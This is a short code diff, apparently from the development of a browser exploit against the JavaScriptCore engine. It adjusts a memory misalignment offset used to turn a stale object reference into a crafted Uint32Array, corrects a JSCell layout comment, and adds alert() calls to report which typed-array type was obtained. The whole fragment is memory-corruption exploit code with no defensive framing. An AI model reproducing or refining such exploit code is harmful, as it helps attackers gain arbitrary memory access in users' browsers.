@@ -219,6 +219,8 @@ function dgc() {
  					'c': smsh,		// void* m_vector
  					'd': u2d(0x100, 0)	// uint32_t m_length;
  				}
+
+				// Why do this? VVV
  				stale[1] = stale[0]
 				
 				// ORIGINAL COMMENT: misalign so we end up in JSObject's properties, which have a crafted Uint32Array pointing to smsh
@@ -226,10 +228,23 @@ function dgc() {
 				// JSCell:
 				//	uint32: StructureID m_structureID;
 				//	uint8:	IndexingType m_indexingType;
-				//	enum:	JSType m_type;
+				//	uint8:	JSType m_type;
 				//	uint8:	TypeInfo::InlineTypeFlags m_flags;
 				//	uint8:	uint8_t m_gcData;
-				bufs[i][k] += 0x10; 
+				
+				//ORIGINAL: bufs[i][k] += 0x10; 
+				bufs[i][k] += 8; 
+				if (stale[0] instanceof Uint32Array){
+					alert("Got proper Uint32Array!");
+				} else if (stale[0] instanceof Float32ArrayType){
+					alert("Got Float32ArrayType!");
+				} else if (stale[0] instanceof Float64ArrayType){
+					alert("Got Float64ArrayType!");
+				} else if (stale[0] instanceof DataViewType){
+					alert("Got DataViewType!");
+				} else {
+					alert("Couldn't find valid type");
+				}
 				
 				
 				/*
